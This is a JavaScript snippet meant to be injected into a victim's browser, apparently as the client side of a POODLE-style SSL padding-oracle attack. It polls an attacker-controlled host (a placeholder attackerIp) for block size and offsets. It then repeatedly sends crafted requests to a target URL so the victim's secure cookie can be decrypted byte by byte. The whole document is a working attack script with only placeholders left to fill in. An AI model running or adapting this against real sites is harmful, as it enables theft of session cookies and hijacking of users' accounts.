<script>
// Need to replace:
//  attackerIp
//  targetUrl

var blockSize = null;

function sendRequest(method, url, data, callback, errorcallback, timeout) {
	var request = new XMLHttpRequest();
	request.open(method || 'GET', url);
	request.responseType = 'text';
	request.timeout = timeout || 5000;
	request.onload = function() {
		callback && callback(request.responseText);
	}
	request.onerror = function() {
		errorcallback && errorcallback(request.status, request.statusText)
	}
	// Make Content-Size minimum 100 so that there is space to grow without changing the length of the Content-Size header
	request.send(Array(101).join('a') + data);
}

function attackByte(dataLengthNeeded) {
	// Ask the server what we should attack next
	sendRequest('GET', 'http://' + attackerIp + "/offset", null, function(response) {
		var offset = parseInt(response, 10);
		data = "";
		path = "";
		if (offset > dataLengthNeeded) dataLengthNeeded += blockSize;
		var path = Array(offset + 1).join("a");
		var data = Array(dataLengthNeeded - offset + 1).join("a");
		var done = false;
		var attackerInterval = setInterval(function() {
			sendRequest('POST', targetUrl + "/" + path, data, function() {
				if (done) return;
				done = true;
				clearInterval(attackerInterval);
				attackByte(dataLengthNeeded); // On success, ask for next offset recursively and repeat
			});
		}, 100)
	});
}

// Get block size
var blockSizeString = ""

sendRequest('GET', 'http://' + attackerIp + "/blocksize", null, function (response) {
	blockSize = parseInt(response.split(' ')[0], 10);
	var dataLengthNeeded = parseInt(response.split(' ')[1], 10);

	// Add the block size to make sure that we have enough room
	//  to shift the cookie as much as we want
	attackByte(dataLengthNeeded + blockSize);
}, null, 30000);

// This will only run if the server does not immediately return a block size
//  which would indicate that this is the first client to connect back
function sendBlockSizeRequest() {
	if (blockSize !== null) return;
	blockSizeString += "a"
	sendRequest('GET', targetUrl + "/" + blockSizeString, null, sendBlockSizeRequest);
}
sendBlockSizeRequest();

</script>
